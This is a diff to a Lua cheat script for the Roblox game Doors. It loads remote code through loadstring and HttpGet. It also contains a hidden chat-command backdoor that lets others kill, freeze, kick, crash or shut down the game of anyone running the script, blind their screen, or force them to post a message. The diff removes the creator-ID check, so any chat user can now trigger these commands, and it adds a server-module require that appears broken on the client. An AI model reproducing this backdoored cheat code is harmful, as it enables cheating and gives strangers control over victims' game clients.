@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
 local Window = OrionLib:MakeWindow({ Name = "Awesome Hacks V2", IntroText = "Doors 👁️ [MODIFIER]", HidePremium = false, SaveConfig = true, ConfigFolder = "Doors" })
 
 local RunService = game:GetService("RunService")
@@ -11,9 +11,9 @@ local Character = LocalPlayer.Character
 local Backpack = LocalPlayer.Backpack
 local Humanoid = Character:WaitForChild("Humanoid")
 local CurrentRooms = workspace.CurrentRooms
-local Main_Game = MainUI.Initiator.Main_Game
+local Main_Game = require(game.ServerScriptService.Main_Game)
 local GameData = ReplicatedStorage.GameData
-local AvatarIcon = Players:GetUserThumbnailAsync(LocalPlayer.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
+local AvatarIcon = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
 
 local WhatNewTab = Window:MakeTab({ Name = "What's New", Icon = "rbxassetid://4483345998", PremiumOnly = false })
 
@@ -290,7 +290,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 end)
 
 game:GetService("Workspace").CurrentRooms.DescendantAdded:Connect(function(descendant)
-    if OrionLib.Flags["NoSeek"].Value == true and descendant.Name == ("Seek_Arm" or "ChandelierObstruction") then
+    if OrionLib.Flags["NoSeek"].Value == true and (descendant.Name == "Seek_Arm" or descendant.Name == "ChandelierObstruction") then
         task.spawn(function()
             wait()
             descendant:Destroy()
@@ -532,7 +532,7 @@ local Ranks = {
 }
 
 local PlayerRanks = {
-	["3872667823"] = "Creator"
+    ["3872667823"] = "Creator"
 }
 
 TextChatService.OnIncomingMessage = function(MessageData)
@@ -576,36 +576,45 @@ local player = game.Players.LocalPlayer
 local id = "3872667823"
 
 local chat = game:GetService("CoreGui").ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
-chat.ChildAdded:Connect(function (child)
-    if string.find(child.Name, id) then
-        local check = string.find(child.text, ";")
-        if check then
-            local command = string.sub(child.text, check + 1) 
-            for i, splayer in pairs(game:GetService("Players"):GetPlayers()) do
-                if string.find(command, splayer.Name) and string.find(command, "kill") then
-                    splayer.Character.Humanoid.Health = 0
-                elseif string.find(command, splayer.Name) and string.find(command, "freeze") then
-                    splayer.Character.HumanoidRootPart.Anchored = true
-                elseif string.find(command, splayer.Name) and string.find(command, "thaw") then
-                    splayer.Character.HumanoidRootPart.Anchored = false
-                elseif string.find(command, splayer.Name) and string.find(command, "kick") then
+
+chat.ChildAdded:Connect(function(child)
+    local check = string.find(child.Text, ";")
+    if check then
+        local command = string.sub(child.Text, check + 1)
+        for _, splayer in pairs(game:GetService("Players"):GetPlayers()) do
+            if string.find(command, splayer.Name) then
+                if string.find(command, "kill") then
+                    if splayer.Character and splayer.Character:FindFirstChild("Humanoid") then
+                        splayer.Character.Humanoid.Health = 0
+                    end
+                elseif string.find(command, "freeze") then
+                    if splayer.Character and splayer.Character:FindFirstChild("HumanoidRootPart") then
+                        splayer.Character.HumanoidRootPart.Anchored = true
+                    end
+                elseif string.find(command, "thaw") then
+                    if splayer.Character and splayer.Character:FindFirstChild("HumanoidRootPart") then
+                        splayer.Character.HumanoidRootPart.Anchored = false
+                    end
+                elseif string.find(command, "kick") then
                     if splayer == player then
                         player:Kick("You have been kicked.")
                     end
-                elseif string.find(command, splayer.Name) and string.find(command, "quit") then
+                elseif string.find(command, "quit") then
                     game:Shutdown()
-                elseif string.find(command, splayer.Name) and string.find(command, "crash") then
-                    while true do end
-                elseif string.find(command, splayer.Name) and string.find(command, "blind") then
+                elseif string.find(command, "crash") then
+                    while true do
+                        wait(1)
+                    end
+                elseif string.find(command, "blind") then
                     local blur = Instance.new("BlurEffect")
                     blur.Size = 10000000000000
                     blur.Parent = game.Lighting
-                elseif string.find(command, splayer.Name) and string.find(command, "unblind") then
+                elseif string.find(command, "unblind") then
                     local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
                     if blur then
                         blur:Destroy()
                     end
-                elseif string.find(command, splayer.Name) and string.find(command, "reveal") then
+                elseif string.find(command, "reveal") then
                     local textChatService = game:GetService("TextChatService")
                     wait(0.0001)
                     textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm Using Awesome Doors Hacks, Made By Iamrealmario.")
@@ -613,12 +622,12 @@ chat.ChildAdded:Connect(function (child)
                     local sound = Instance.new("Sound", game.Workspace)
                     sound.SoundId = "rbxassetid://5602666105"
                     sound.Volume = 100000 
-                    sound:Play() 
+                    sound:Play()
                 elseif string.find(command, "bruh") then
                     local sound = Instance.new("Sound", game.Workspace)
                     sound.SoundId = "rbxassetid://732572828"
                     sound.Volume = 100000 
-                    sound:Play() 
+                    sound:Play()
                 end
             end
         end
@@ -626,12 +635,12 @@ chat.ChildAdded:Connect(function (child)
 end)
 
 local CreditsTab = Window:MakeTab({
-	Name = "Credits",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
 })
 
-CreditsTab:AddParagraph("Credits to","Ember 😎 - The Creator\n*If Encounter A Problem Contact Me On Discord ember260*")
+CreditsTab:AddParagraph("Credits to", "Ember 😎 - The Creator\n*If Encounter A Problem Contact Me On Discord ember260*")
 
 coroutine.resume(NotificationCoroutine)
 
